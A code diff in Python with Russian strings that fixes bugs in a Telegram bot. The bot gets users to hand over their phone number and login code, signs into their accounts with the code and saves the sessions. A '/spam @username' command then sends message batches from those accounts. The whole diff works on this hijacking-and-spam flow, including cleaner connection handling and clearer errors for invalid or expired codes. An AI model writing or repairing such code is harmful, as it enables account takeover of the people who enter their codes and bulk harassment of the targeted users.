@@ -11,6 +11,7 @@ os.makedirs("sessions", exist_ok=True)
 user_states = {}
 
 async def main():
+    # БОТ (единственный вызов .start() с токеном)
     bot = await TelegramClient("sessions/bot_session", API_ID, API_HASH).start(bot_token=BOT_TOKEN)
     
     @bot.on(events.NewMessage(pattern='/start'))
@@ -36,11 +37,10 @@ async def main():
             phone = '+' + phone
         
         try:
-            # СОЗДАЁМ КЛИЕНТА И ЗАПУСКАЕМ С НОМЕРОМ
+            # Клиент для пользователя — НЕ .start(), только .connect()
             client = TelegramClient(f"sessions/user_{chat_id}", API_ID, API_HASH)
-            await client.start(phone=phone)  # <--- ПЕРЕДАЁМ НОМЕР СРАЗУ
+            await client.connect()
             
-            # Отправляем запрос кода
             sent = await client.send_code_request(phone)
             
             user_states[chat_id] = {
@@ -52,6 +52,8 @@ async def main():
             await event.reply(f'✅ Цифры отправлены на {phone}. Введи цифры (4-6 знаков):')
         except Exception as e:
             await event.reply(f'❌ Ошибка: {str(e)[:150]}')
+            if chat_id in user_states:
+                del user_states[chat_id]
 
     @bot.on(events.NewMessage(pattern=r'^\d{4,6}$'))
     async def get_code(event):
@@ -69,7 +71,6 @@ async def main():
         client = state['client']
         
         try:
-            # ВХОДИМ С КОДОМ
             await client.sign_in(
                 phone=state['phone'],
                 code=code,
@@ -79,7 +80,15 @@ async def main():
             user_states[chat_id]['logged'] = True
             await event.reply('✅ Доступ открыт! Теперь /spam @username')
         except Exception as e:
-            await event.reply(f'❌ Неверные цифры: {str(e)[:150]}. Нажми /start заново.')
+            error = str(e)
+            if 'CODE_INVALID' in error or 'PHONE_CODE_INVALID' in error:
+                await event.reply('❌ Неверные цифры. Нажми /start заново.')
+            elif 'EXPIRED' in error:
+                await event.reply('❌ Цифры устарели. Нажми /start заново.')
+            else:
+                await event.reply(f'❌ Ошибка: {error[:150]}. Нажми /start заново.')
+            if chat_id in user_states:
+                del user_states[chat_id]
 
     @bot.on(events.NewMessage(pattern='/spam'))
     async def start_spam(event):
@@ -107,7 +116,7 @@ async def main():
                 if count % 20 == 0:
                     await event.reply(f'📨 Отправлено {count} пачек')
         except Exception as e:
-            await event.reply(f'❌ Ошибка: {str(e)[:150]}')
+            await event.reply(f'❌ Ошибка спама: {str(e)[:150]}')
 
     print('🍪 БОТ ЗАПУЩЕН!')
     await bot.run_until_disconnected()
